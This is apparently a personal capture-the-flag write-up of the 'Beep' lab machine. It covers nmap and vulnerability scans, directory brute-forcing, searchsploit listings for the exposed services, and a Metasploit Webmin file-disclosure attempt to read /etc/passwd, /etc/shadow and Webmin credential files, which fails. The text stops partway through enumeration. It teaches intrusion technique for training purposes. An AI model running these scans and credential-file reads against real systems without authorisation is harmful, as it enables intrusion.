# Summary
### 1. NMAP
x

### 2. Finding Attack Vector
x

### 3. Attacking Webmin (Port 10000)
x

### 4. Searchsploit.. More Enumeration :(
x

### 5. Attempt to Attack Webmin Again!
x

### 6. x
x

### 7. x
x

### 8. x
x

### 9. x
x

# Attack
## 1. NMAP
First typical scan.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.7 -Pn -v
...
Scanning 10.10.10.7 [1000 ports]
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 4445/tcp on 10.10.10.7
Discovered open port 10000/tcp on 10.10.10.7
...
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK ANNOTATEMORE X-NETSCAPE NAMESPACE URLAUTHA0001 LIST-SUBSCRIBED MULTIAPPEND IMAP4rev1 RIGHTS=kxte CATENATE NO SORT=MODSEQ IDLE CONDSTORE STARTTLS THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT BINARY QUOTA LISTEXT CHILDREN IMAP4 ATOMIC MAILBOX-REFERRALS UNSELECT RENAME ACL ID UIDPLUS LITERAL+
443/tcp   open  ssl/https?
|_ssl-date: 2020-11-29T10:56:57+00:00; +1h00m02s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```
Holy shit, that is a lotta open ports!

Let's do a vulnerability scan too.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.7 -Pn -v
...
Scanning 10.10.10.7 [1000 ports]
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 10000/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 4445/tcp on 10.10.10.7
...
PORT      STATE SERVICE
22/tcp    open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
25/tcp    open  smtp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown: 
80/tcp    open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|_http-passwd: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
110/tcp   open  pop3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
111/tcp   open  rpcbind
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
143/tcp   open  imap
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
443/tcp   open  https
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown: 
993/tcp   open  imaps
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
995/tcp   open  pop3s
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
3306/tcp  open  mysql
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
10000/tcp open  snet-sensor-mgmt
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
```

## 2. Finding Attack Vector
Let's find out more on the http servers.

`Port 80 & Port 443`: Going to `https://10.10.10.7`, we see an expired certificate. We can KIV this. Accepting the risk, we see it is a login page for "Elastix". We also get automatically redirected to `https` despite trying to go `http`. We know from the scans this is Apache httpd 2.2.3.

`Port 10000`: We see a Webmin webpage with another login page. We know from the scans this is MiniServ 1.570 (Webmin httpd). We also see something interesting.
```
http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
```
Alright then, let's give this attack Webmin on Port 10000 a shot based on a [guide](https://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure/) & [it's code](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/webmin/file_disclosure.rb).

We also do some GoBusters, for example:
```
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7:10000" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
...
Error: error on running goubster: unable to connect to https://10.10.10.7:10000/: invalid certificate: x509: cannot validate certificate for 10.10.10.7 because it doesn't contain any IP SANs
...
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
...
Error: error on running goubster: unable to connect to https://10.10.10.7/: invalid certificate: x509: certificate has expired or is not yet valid
```
Some errors as we can see. Let's move on first!

## 3. Attacking Webmin (Port 10000)
Let's run this `auxiliary/admin/webmin/file_disclosure` exploit.
```
msf5 > use auxiliary/admin/webmin/file_disclosure

msf5 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 10.10.10.7

[*] Attempting to retrieve /etc/passwd...
[-] Auxiliary failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[-] Call stack:
[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername'
[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:752:in `getpeername_as_array'
[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-socket-0.1.23/lib/rex/socket.rb:765:in `peerinfo'
[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:640:in `peerinfo'
[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:233:in `_send_recv'
[-]   /usr/share/metasploit-framework/lib/rex/proto/http/client.rb:211:in `send_recv'
[-]   /usr/share/metasploit-framework/lib/msf/core/exploit/http/client.rb:336:in `send_request_raw'
[-]   /usr/share/metasploit-framework/modules/auxiliary/admin/webmin/file_disclosure.rb:65:in `run'
[*] Auxiliary module execution completed
```
Nope, didn't work. What about doing exploit instead?
```
msf5 auxiliary(admin/webmin/file_disclosure) > exploit
[*] Running module against 10.10.10.7

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 200 Bad Request
<h1>Error - Bad Request</h1>
<pre>This web server is running in SSL mode. Try the URL <a href='https://10.10.10.7:10000/'>https://10.10.10.7:10000/</a> instead.<br></pre>
[*] Auxiliary module execution completed

msf5 auxiliary(admin/webmin/file_disclosure) > set ssl true
...
msf5 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 10.10.10.7

[*] Attempting to retrieve /etc/passwd...
[*] The server returned: 404 File not found
<h1>Error - File not found</h1>
[*] Auxiliary module execution completed
```
Ah this works, but no file found.
I've tried finding common files, such as:
```
/etc/webmin/miniserv.conf
/etc/webmin/htusers
/etc/webmin/virtual-server/plainpass
/etc/webmin/virtual-server/plainpass dir.
/etc/webmin/miniserv.users
/etc/shadow
```
But they all return with `File not found` error. There should be another way in..

## 4. Searchsploit.. More Enumeration :(
Let's do some searches for the versions.
```
hippoeug@kali:~$ searchsploit openssh 4.3
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                    | linux/remote/45210.py
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                        | multiple/dos/2444.sh
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                      | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                            | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation              | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                          | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                              | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Doesn't look like there's anything interesting in openssh.

```
hippoeug@kali:~$ searchsploit apache httpd
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' Directory Listing                                                | cgi/remote/20435.txt
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi                                     | multiple/dos/19536.txt
Apache Httpd mod_proxy - Error Page Cross-Site Scripting                                                          | multiple/webapps/47688.md
Apache Httpd mod_rewrite - Open Redirects                                                                         | multiple/webapps/47689.md
NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0.8.14 - ScriptAlias Source Retrieval                                    | multiple/remote/20595.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing interesting in apache httpd either.

```
hippoeug@kali:~$ searchsploit pop3d
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cyrus IMAPD - pop3d popsubfolders USER Buffer Overflow (Metasploit)                                               | linux/remote/16836.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)                                                            | linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)                                                            | multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)                                                            | linux/remote/2185.pl
tPop3d 1.5.3 - Denial of Service                                                                                  | linux/dos/11893.pl
Vpop3d - Remote Denial of Service                                                                                 | windows/dos/23053.pl
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit imapd
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Alt-N MDaemon 9.6.4 - IMAPD FETCH Buffer Overflow (Metasploit)                                                    | windows/remote/16482.rb
Cyrus IMAPD - pop3d popsubfolders USER Buffer Overflow (Metasploit)                                               | linux/remote/16836.rb
Cyrus IMAPD 1.4/1.5.19/2.0.12/2.0.16/2.1.9/2.1.10 - Pre-Login Heap Corruption                                     | linux/dos/22061.txt
Cyrus imapd 2.2.4 < 2.2.8 - 'imapmagicplus' Remote Overflow                                                       | linux/remote/903.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (1)                                                            | linux/remote/1813.c
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (2)                                                            | multiple/remote/2053.rb
Cyrus IMAPD 2.3.2 - 'pop3d' Remote Buffer Overflow (3)                                                            | linux/remote/2185.pl
Eudora Qualcomm WorldMail 3.0 - 'IMAPd' Remote Overflow                                                           | windows/remote/1380.py
Eudora Qualcomm WorldMail 3.0 - IMAPd 'LIST' Remote Buffer Overflow (Metasploit)                                  | windows/remote/16474.rb
Eudora Qualcomm WorldMail 9.0.333.0 - IMAPd Service UID Buffer Overflow                                           | windows/remote/31694.py
FTGate4 Groupware Mail Server 4.1 - imapd Remote Buffer Overflow (PoC)                                            | windows/dos/1327.pl
Ipswitch IMail 5.0 - Imapd Buffer Overflow (Denial of Service) (PoC)                                              | multiple/dos/19377.txt
IPSwitch IMail Server 8.15 - IMAPD Remote Code Execution                                                          | linux/remote/1124.pl
IPSwitch IMail Server 8.20 - IMAPD Remote Buffer Overflow                                                         | windows/remote/3627.c
Linux imapd - Remote Overflow / File Retrieve                                                                     | linux/remote/340.c
MailEnable - IMAPD W3C Logging Buffer Overflow (Metasploit)                                                       | windows/remote/16480.rb
MailEnable 1.54 Pro - Universal IMAPD W3C Logging Buffer Overflow (Metasploit)                                    | windows/remote/1332.pm
MailEnable Enterprise 1.x - IMAPd Remote Overflow                                                                 | linux/remote/915.c
MailEnable IMAPD 1.54 - STATUS Request Buffer Overflow (Metasploit)                                               | windows/remote/16485.rb
MailEnable IMAPD Enterprise 2.32 < 2.34 - Remote Buffer Overflow                                                  | windows/remote/3319.pl
MailEnable IMAPD Professional (2.35) - Login Request Buffer Overflow (Metasploit)                                 | windows/remote/16475.rb
MailEnable IMAPD Professional 2.35 - Remote Buffer Overflow                                                       | windows/remote/3320.pl
MDaemon 8.0.3 - IMAPD CRAM-MD5 Authentication Overflow (Metasploit)                                               | windows/remote/1151.pm
Mercur IMAPD 5.00.14 (Windows x86) - Remote Denial of Service                                                     | windows_x86/dos/3527.pl
Mercury/32 4.52 IMAPD - 'SEARCH' (Authenticated) Overflow                                                         | windows/remote/4429.pl
Netscape Messaging Server 3.55 & University of Washington imapd 10.234 - Remote Buffer Overflow                   | linux/remote/19107.c
Perdition 1.17 - IMAPD __STR_VWRITE Remote Format String                                                          | linux/dos/30724.txt
UoW IMAPd Serve 10.234/12.264 - COPY Buffer Overflow (Metasploit)                                                 | unix/remote/19849.pm
UoW IMAPd Server - LSUB Buffer Overflow (Metasploit)                                                              | linux/remote/16846.rb
UoW IMAPd Server 10.234/12.264 - LSUB Buffer Overflow (Metasploit)                                                | unix/remote/19848.pm
UoW IMAPd Server 10.234/12.264 - Remote Buffer Overflow                                                           | unix/remote/19847.c
WorldMail IMAPd 3.0 - Remote Overflow (SEH) (Egghunter)                                                           | windows/remote/18354.py
WU-IMAPd 2000/2001 - Partial Mailbox Attribute Remote Buffer Overflow (1)                                         | linux/remote/21442.c
WU-IMAPd 2000/2001 - Partial Mailbox Attribute Remote Buffer Overflow (2)                                         | linux/remote/21443.c
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing we can use, we know our pop3d is updated, `Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4`.

```
hippoeug@kali:~$ searchsploit webmin
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                   | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                  | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                              | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                          | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                 | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                       | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                           | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                      | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                             | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                           | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                              | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                            | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                              | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                 | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                         | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                               | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                     | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
There might be something we can use here, since compatible with our webmin, `MiniServ 1.570 (Webmin httpd)`.

## 5. Attempt to Attack Webmin Again!
Since we saw a few interesting things from using `searchsploit`, we do more [research](https://www.cvedetails.com/metasploit-modules/vendor-358/Webmin.html). We see that we can use two attacks supported by Metasploit, first being `CVE-2019-9624  Webmin Upload Authenticated RCE` and second being `CVE-2019-12840  Webmin Package Updates Remote Command Execution`.

We try both Metasploit modules, first being [`use exploit/unix/webapp/webmin_upload_exec`](https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_upload_exec/) of `Webmin Upload Authenticated RCE`, and second being [`use exploit/linux/http/webmin_packageup_rce`](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/) of `Webmin Package Updates Remote Command Execution`. However, both modules required credentials to the Webmin, USERNAME & PASSWORD.

To go down this path, we must get the some credentials.

## 6. Finding another Attack Vector, More Enumeration
At this point, I've pretty much no idea what to do at this point and had to look up for clues!

Turns out, the Gobuster attempted in step 2 was correct! We just needed to add a `-k` flag to disable certificates check.
```
hippoeug@kali:~$ gobuster dir -u "https://10.10.10.7:443" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.7:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/08 22:54:51 Starting gobuster
===============================================================
/images (Status: 301)
/help (Status: 301)
/themes (Status: 301)
/modules (Status: 301)
/mail (Status: 301)
/admin (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/var (Status: 301)
/panel (Status: 301)
/libs (Status: 301)
/recordings (Status: 301)
/configs (Status: 301)
/vtigercrm (Status: 301)
===============================================================
2020/12/08 23:36:08 Finished
===============================================================
```
We actually see `/vtigercrm`! Using the same wordlist but doing it on the GUI Dirbuster `OWASP Dirbuster 1.0-RC1`, we see way more directories, but mainly related to `Elastix` which we saw when we visited `https://10.10.10.7` with our web browser.
```
hippoeug@kali:~$ dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /index.php - 200
Dir found: / - 200
Dir found: /images/ - 200
File found: /register.php - 200
Dir found: /cgi-bin/ - 403
Dir found: /help/ - 200
Dir found: /themes/ - 200
Dir found: /icons/ - 200
Dir found: /themes/elastixneo/ - 200
Dir found: /themes/elastixneo/images/ - 200
File found: /help/frameLeft.php - 200
File found: /help/frameRight.php - 200
Dir found: /modules/ - 200
Dir found: /themes/al/ - 200
Dir found: /themes/default/ - 200
Dir found: /themes/elastixneo/_common/ - 200
Dir found: /themes/elastixblue/ - 200
File found: /themes/elastixneo/applet.css - 200
Dir found: /themes/elastixeasy-Black/ - 200
File found: /themes/elastixneo/content.css - 200
...
ERROR: https://10.10.10.7/themes/default/_common/{$url} - IllegalArgumentException Invalid uri 'https://10.10.10.7/themes/default/_common/{$url}': escaped absolute path not valid
Exception in thread "Thread-8" java.lang.IllegalArgumentException: Invalid uri 'https://10.10.10.7:443/themes/al/_common/themes/{$THEMENAME}/thereIsNoWayThat-You-CanBeThere/': escaped absolute path not valid
        at org.apache.commons.httpclient.HttpMethodBase.<init>(HttpMethodBase.java:222)
        at org.apache.commons.httpclient.methods.GetMethod.<init>(GetMethod.java:89)
        at com.sittinglittleduck.DirBuster.GenBaseCase.genBaseCase(GenBaseCase.java:126)
        at com.sittinglittleduck.DirBuster.HTMLparse.findBaseCasePoint(HTMLparse.java:332)
        at com.sittinglittleduck.DirBuster.HTMLparse.run(HTMLparse.java:196)
Exception in thread "Thread-9" java.lang.IllegalArgumentException: Invalid uri 'https://10.10.10.7:443/themes/elastixblue/_common/themes/{$THEMENAME}/thereIsNoWayThat-You-CanBeThere/': escaped absolute path not valid
        at org.apache.commons.httpclient.HttpMethodBase.<init>(HttpMethodBase.java:222)
        at org.apache.commons.httpclient.methods.GetMethod.<init>(GetMethod.java:89)
        at com.sittinglittleduck.DirBuster.GenBaseCase.genBaseCase(GenBaseCase.java:126)
        at com.sittinglittleduck.DirBuster.HTMLparse.findBaseCasePoint(HTMLparse.java:332)
        at com.sittinglittleduck.DirBuster.HTMLparse.run(HTMLparse.java:196)
java.lang.IllegalArgumentException: Invalid uri 'https://10.10.10.7/themes/elastixblue/_common/themes/{$THEMENAME}/': escaped absolute path not valid
        at org.apache.commons.httpclient.HttpMethodBase.<init>(HttpMethodBase.java:222)
        at org.apache.commons.httpclient.methods.HeadMethod.<init>(HeadMethod.java:94)
        at com.sittinglittleduck.DirBuster.Worker.run(Worker.java:152)
        at java.base/java.lang.Thread.run(Thread.java:834)
ERROR: https://10.10.10.7/themes/elastixblue/_common/themes/{$THEMENAME}/ - IllegalArgumentException Invalid uri 'https://10.10.10.7/themes/elastixblue/_common/themes/{$THEMENAME}/': escaped absolute path not valid
File found: /config.php - 200
Dir found: /error/ - 403
...
```

We could now look at finding vulnerabilities in Elastix and VTigerCRM as we've seen in the directories. Let's do some SearchSploits.
```
hippoeug@kali:~$ searchsploit elastix
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                               | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                             | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                       | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                    | php/webapps/37637.pl
